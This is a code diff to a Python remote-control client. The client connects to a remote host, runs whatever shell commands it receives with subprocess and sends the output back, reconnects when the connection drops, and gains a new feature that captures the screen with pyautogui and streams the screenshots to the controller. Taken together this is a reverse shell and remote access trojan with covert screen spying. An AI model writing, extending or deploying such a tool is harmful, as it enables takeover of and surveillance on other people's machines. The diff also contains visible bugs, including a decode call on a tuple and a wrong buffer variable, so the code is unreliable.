@@ -1,8 +1,11 @@
+import multiprocessing
+from queue import Queue
 import subprocess
 import socket, sys
 import struct, math
+import pyautogui as py
 from threading import Thread
-import socket
+import socket, io
 
 PACKET_SIZE = 1024
 
@@ -58,7 +61,7 @@ def recvPackets(sckt: socket, debug: bool = False) -> bytearray:
         nOfPacketsLeft = packetHeader[4]
         payload = recvAll(sckt, packetLength)
         dataReceived += (payload)
-
+        print(packetHeader, payload)
         if debug:
             print("payload: ", dataReceived)
         
@@ -71,38 +74,65 @@ def recvPackets(sckt: socket, debug: bool = False) -> bytearray:
                 nOfPacketsLeft = packetHeader[4]
                 payload = recvAll(sckt, packetLength) 
                 dataReceived += (payload)
-            
-            dataReceived = b"cmdSS" + dataReceived
         
-        return dataReceived
+        
+        return (packetHeader[5], dataReceived)
     except:
         return b"EXIT0x02"
 
+def screenShare(screenShareActivated: bool, frameQueue: Queue):
+    while screenShareActivated:
+        frame = py.screenshot()
+        frameBytes = io.BytesIO()
+        frame.save(frameBytes, format="PNG")
+        frameQueue.put(frame.getvalue())
 
 
 def comunicazione(HOST, PORT, debug: bool = False):
     clientSocket = connectSocket(HOST, PORT, True)
+
+    screenShareActivated = False
+    screenBuffersQueue = multiprocessing.Queue(20)
+    screenSharer = multiprocessing.Process(target=screenShare, args=(screenShareActivated, screenBuffersQueue))
+
     while 1:
-        command = recvPackets(clientSocket).decode()
+        typeOfRequest, command = recvPackets(clientSocket).decode()
 
         # DEBUG
         if debug and not command == "":
             print("command: ", command)
 
         if command == "EXIT0x01":
+            screenSharer.terminate()
             sys.exit(0)
         if command == "EXIT0x02":
+            screenSharer.terminate()
+            screenBuffersQueue.close()
+            screenShareActivated = False
             clientSocket = connectSocket(HOST, PORT, True)      
 
-        if "cmdSS" in command:
-            output = subprocess.run(command.replace("cmdSS", ""), shell=True, capture_output=True)
-            sendPackets(clientSocket, output.stdout, True, 99)
+        if typeOfRequest == 0x63:
+            output = subprocess.run(command, shell=True, capture_output=True)
+            
+            if not output.stdout == b"":
+                sendPackets(clientSocket, output.stdout, True, 99)
+            else:
+                sendPackets(clientSocket, b"No output!", True, 99)
+
             # DEBUG
             if debug and not output.stdout == "":
                 print(output.stdout)
 
-        if "videoSS" in command:
-            pass
+        if typeOfRequest == 0x76:
+            if not screenSharer.is_alive() and "start" in command:
+                screenSharer.start()
+
+            if "stop" in command:
+                screenSharer.terminate()
+                continue
+            
+            if "continue" in command:
+                sendPackets(clientSocket, screenBuffersQueue.get(), True, 0x76)
 
 
 
